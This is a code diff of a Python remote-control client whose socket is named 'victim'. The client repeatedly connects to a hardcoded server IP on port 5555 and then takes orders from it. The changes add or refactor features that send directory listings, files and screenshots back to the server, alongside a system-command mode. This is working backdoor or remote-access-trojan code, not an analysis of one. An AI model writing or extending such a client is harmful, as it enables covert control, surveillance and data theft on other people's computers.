@@ -68,18 +68,25 @@ def delete_file(file_path):
         return f"An error occurred while deleting a file: {e}"
 
 
-ip_server = '10.120.128.214'# Change to valid ip
+ip_server = '192.168.140.13'# Change to valid ip
 
 
 def main():
+    def list_cd():
 
-    print("im started")
+        result = subprocess.run(['dir'], shell=True, capture_output=True, text=True, encoding="cp866")
+        size_of_result = sys.getsizeof(result.stdout)
+
+        victim.send(str(size_of_result).encode())
+        victim.send(result.stdout.encode())
+
+    print("Client started")
     while True:
+        print("Trying connect to server")
         try:
             victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             victim.connect((ip_server, 5555))
-            print("Trying connect to server")
-            result = "all good"
+            print("Connection established")
             break
         except Exception as e:
             print(f"Error: {e}")
@@ -95,8 +102,8 @@ def main():
 
         if chosen_operation == "work_with_file" or chosen_operation == "2" or chosen_operation == "w":
             while True:
-                current_directory = os.getcwd()
-                victim.send(current_directory.encode())
+
+                victim.send(os.getcwd().encode())
                 operation = victim.recv(1024).decode()
 
                 if operation == "Download":
@@ -136,7 +143,7 @@ def main():
                             got_new_name = victim.recv(1024).decode()
                             got_new_extension = victim.recv(1024).decode()
 
-                            current_directory = current_directory + r"\got_file.png"
+                            current_directory = os.getcwd() + r"\got_file.png"
                             file_path = current_directory
                             chosen_directory = got_new_file_path
                             result = ""
@@ -169,8 +176,7 @@ def main():
                         data = file.read(file_size)
                         victim.send(data)
 
-                    current_directory_for_screenshot = os.getcwd()
-                    current_directory_for_screenshot = current_directory_for_screenshot + r"\screenshot.png"
+                    current_directory_for_screenshot = os.getcwd() + r"\screenshot.png"
                     os.remove(current_directory_for_screenshot)
 
                 elif operation == "snapshot":
@@ -225,13 +231,10 @@ def main():
                     break
 
                 elif operation == "ls":
-                    result = subprocess.run(['dir'], shell=True, capture_output=True, text=True, encoding="cp866")
-                    size_of_result = sys.getsizeof(result)
-
-                    victim.send(str(size_of_result).encode())
-                    victim.send(result.stdout.encode())
+                    list_cd()
 
                 elif operation == "change_directory":
+                    list_cd()
                     victim.send(os.getcwd().encode())
                     transition = victim.recv(1024).decode()
                     try:
@@ -240,6 +243,9 @@ def main():
 
                     except Exception as e:
                         victim.send("Something wrong !".encode())
+
+                elif operation == "incorrect operation":
+                    pass
 
         elif chosen_operation == "system_command" or chosen_operation == "s" or chosen_operation == "3":
             while True:
